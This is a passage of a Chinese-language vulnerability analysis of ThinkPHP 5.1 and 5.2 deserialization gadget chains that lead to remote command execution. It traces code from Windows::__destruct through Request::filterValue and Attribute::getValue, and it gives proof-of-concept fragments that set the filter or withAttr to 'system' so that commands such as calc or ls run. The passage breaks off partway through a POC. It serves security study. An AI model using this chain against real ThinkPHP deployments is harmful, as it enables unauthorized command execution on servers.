    public function isAjax($ajax = false)
        {
            $value  = $this->server('HTTP_X_REQUESTED_WITH');
            $result = 'xmlhttprequest' == strtolower($value) ? true : false;
            if (true === $ajax) {
                return $result;
            }
            $result           = $this->param($this->config['var_ajax']) ? true : $result;
            $this->mergeParam = false;
            return $result;
        }
在isAjax函数中，我们可以控制`$this->config['var_ajax']`，`$this->config['var_ajax']`可控就意味着param函数中的`$name`可控。param函数中的`$name`可控就意味着input函数中的`$name`可控。
而param函数可以获得`$_GET数组`并赋值给`$this->param`。
再回到input函数中
    ....
        public function input($data = [], $name = '', $default = null, $filter = '')
        {
            if (false === $name) {
                // 获取原始数据
                return $data;
            }
            ....
             $data = $this->getData($data, $name);
            ....
           // 解析过滤器
            $filter = $this->getFilter($filter, $default);
            if (is_array($data)) {
                array_walk_recursive($data, [$this, 'filterValue'], $filter);
              .....
            } else {
                $this->filterValue($data, $name, $filter);
            }
    .....
看一下`$data = $this->getData($data, $name);`  
`$name`的值来自于`$this->config['var_ajax']`，我们跟进getData函数。
    protected function getData(array $data, $name)
        {
            foreach (explode('.', $name) as $val) {
                if (isset($data[$val])) {
                    $data = $data[$val];
                } else {
                    return;
                }
            }
            return $data;
        }
这里`$data` = `$data[$val]` = `$data[$name]`
然后跟进getFilter函数
    protected function getFilter($filter, $default)
        {
            if (is_null($filter)) {
                $filter = [];
            } else {
                $filter = $filter ?: $this->filter;
                if (is_string($filter) && false === strpos($filter, '/')) {
                    $filter = explode(',', $filter);
                } else {
                    $filter = (array) $filter;
                }
            }
            $filter[] = $default;
            return $filter;
        }
这里的`$filter`来自于`$this->filter`，我们需要定义一个带有`$this->filter`的函数
    ....
    if (is_array($data)) {
                array_walk_recursive($data, [$this, 'filterValue'], $filter);
                ....
此时在input函数中的回调函数得知,`filterValue.value`的值为第一个通过GET请求的值`input.data`，而`filterValue.key`为GET请求的键`input.name`，并且`filterValue.filters`就等于`input.filter`的值。
到这里思路有了，回过头来看我们poc的利用过程，首先在上一步toArray()方法。创建了一个Request()对象，然后会触发poc里的`__construct()`方法，接着`new
Request()->
visible($name)`，该对象调用了一个不存在的方法会触发`__call`方法，看一下`__construct()`方法内容：
    function __construct(){
            $this->filter = "system";
            $this->config = ["var_ajax"=>'lin'];
            $this->hook = ["visible"=>[$this,"isAjax"]];
        }
    public function __call($method, $args)  //$method为不存在方法，$args为不存在方法以数组形式存的参数，此时$method = visible，$args = $name = ["calc.exe","calc"]
        {
            if (array_key_exists($method, $this->hook)) {    //查找键名$method是否存在数组hook中，满足条件
                array_unshift($args, $this);                 //将新元素插入到数组$args中，此时$args = [$this,"calc.exe","calc"]
                return call_user_func_array($this->hook[$method], $args);   //执行回调函数isAjax, ([$this,isAjax],[$this,"calc.exe","calc"])
            }
            throw new Exception('method not exists:' . static::class . '->' . $method);
        }
接着看isAjax方法的调用过程，
    public function isAjax($ajax = false)
        {
            .....
            $result = $this->param($this->config['var_ajax']) ? true : $result; 
            //这里$this->config['var_ajax'] = 'lin'
            $this->mergeParam = false;
            return $result;
        }
然后跟进param()方法
    public function param($name = '', $default = null, $filter = '') //$name = $this->config['var_ajax'] = 'lin'
        {
            if (!$this->mergeParam) {
                $method = $this->method(true);
                // 自动获取请求变量
                switch ($method) {
                    case 'POST':
                        $vars = $this->post(false);
                        break;
                    case 'PUT':
                    case 'DELETE':
                    case 'PATCH':
                        $vars = $this->put(false);
                        break;
                    default:
                        $vars = [];
                }
                // 当前请求参数和URL地址中的参数合并为一个数组。
                $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));
                $this->mergeParam = true;
            }
          .....
            return $this->input($this->param, $name, $default, $filter); //$this->param当前get请求参数数组('lin' => 'calc')、$name = $this->config['var_ajax'] = lin
        }
然后跟进input()方法
    public function input($data = [], $name = '', $default = null, $filter = '')
        {         //当前请求参数数组'lin'=>'calc'、$name = $this->config['var_ajax']=lin
            if (false === $name) {
                // 获取原始数据
                return $data;
            }
            $name = (string) $name; //指定lin为字符串
            if ('' != $name) {
                // 解析name
                if (strpos($name, '/')) {
                    list($name, $type) = explode('/', $name);
                }
                $data = $this->getData($data, $name);  //这里先跟进该函数，$data = $data[$val] = $data['lin'] = calc
                 ......
                // 解析过滤器
            $filter = $this->getFilter($filter, $default);  //$filter[0=>'system',1=>$default]  ，这里先跟进该函数
            if (is_array($data)) {
                array_walk_recursive($data, [$this, 'filterValue'], $filter);    //回调函数filterValue ，跟进该函数，$data = filterValue.$value = calc 、 $filter = filterValue.$filters = [0->system,1->$default] 、 $name = filterValue.$key = 'lin'
              .....
            } else {
                $this->filterValue($data, $name, $filter);
            }
            if (isset($type) && $data !== $default) {
                // 强制类型转换
                $this->typeCast($data, $type);
            }
            return $data;
        }
    protected function getData(array $data, $name)//$data['lin'=>'calc'],$name = 'lin'
        {
            foreach (explode('.', $name) as $val) { //分割成数组['lin']
                if (isset($data[$val])) {
                    $data = $data[$val]; // 此时$data = $data['lin'] = 'calc' ,回到上面input()
                } else {
                    return;
                }
            }
            return $data;
        }
    protected function getFilter($filter, $default)  //$filter在poc里定义为system
        {
            if (is_null($filter)) {
                $filter = [];
            } else {  
                $filter = $filter ?: $this->filter;      //$filter = $this->filter = system
                if (is_string($filter) && false === strpos($filter, '/')) {
                    $filter = explode(',', $filter);     //分隔为数组['system']
                } else {
                    $filter = (array) $filter;
                }
            }
            $filter[] = $default;       //此时$filter[]为{ [0]=>"system" [1]=>$default }，回到上面Input()
            return $filter;   
        }
    private function filterValue(&$value, $key, $filters)
        {
            $default = array_pop($filters);  //删除数组最后一个元素，此时$filters=$filter[0]=system
            foreach ($filters as $filter) {     //遍历数组
                if (is_callable($filter)) {     //验证变量名能否作为函数调用，system()
                    // 调用函数或者方法过滤
                    $value = call_user_func($filter, $value);    //执行回调函数system('calc');
                }
在public/index.php处可设一个触发点
最终在filterValue()方法处执行系统命令导致RCE。
**利用链：**
    \thinkphp\library\think\process\pipes\Windows.php - > __destruct()
    \thinkphp\library\think\process\pipes\Windows.php - > removeFiles()
    Windows.php: file_exists()
    thinkphp\library\think\model\concern\Conversion.php - > __toString()
    thinkphp\library\think\model\concern\Conversion.php - > toJson() 
    thinkphp\library\think\model\concern\Conversion.php - > toArray()
    thinkphp\library\think\Request.php   - > __call()
    thinkphp\library\think\Request.php   - > isAjax()
    thinkphp\library\think\Request.php - > param()
    thinkphp\library\think\Request.php - > input()
    thinkphp\library\think\Request.php - > filterValue()
## 5.2.x版本分析
5.1版本和5.2版本差别不大，但在5.2版本中不存在这样的一个`__call`方法，因此不能利用5.1版本中的方法，不过`__call`之前的方法仍然可以使用，这意味着我们需要重新找一个最终达成命令执行的函数调用或者另外找一个`__call`方法去代替5.1版本中的，这里分析一下师傅们的方法。
**方法一：**
这种方法是利用think\model\concern\Attribute类中的getValue方法中可控的一个动态函数调用的点，
    $closure = $this->withAttr[$fieldName]; //$withAttr、$value可控，令$closure=system，
    $value   = $closure($value, $this->data);//system('ls',$this->data)，命令执行
这里利用了system()的特性，`system ( string $command [, int &$return_var ] ) :
string`，执行命令，输出和返回结果。第二个参数是可选的，用来得到命令执行后的状态码。
这种方法比较容易理解。下面带着poc分析下利用方法，因为toArray()前面都一样就不讲了，先给出利用链。
    think\process\pipes\Windows->__destruct()
     think\process\pipes\Windows->removeFiles()
     think\model\concern\Conversion->__toString()
     think\model\concern\Conversion->toJson()
     think\model\concern\Conversion->toArray()
     think\model\concern\Attribute->getAttr()
     think\model\concern\Attribute->getValue()
整体大致没变，通过触发`__destruct()`方法中的`removeFiles()`，该函数内用了一个`file_exists()`方法处理对象实例时会当成字符串，从而触发`__toString()`，调用`toJson()`
=> `toArray()` => `getAttr()`，最后在`getValue()`处调用动态函数导致命令执行。由于2版本和1版本在
`toArray()`处有点不同，我们从这开始分析，  
**poc**
    files = [$files];
            }
        }
    }
    namespace think\model\concern {
        trait Conversion
        {    
        }
        trait Attribute
        {
            private $data;
            private $withAttr = ["lin" => "system"];
            public function get()
            {
                $this->data = ["lin" => "ls"];
            }
        }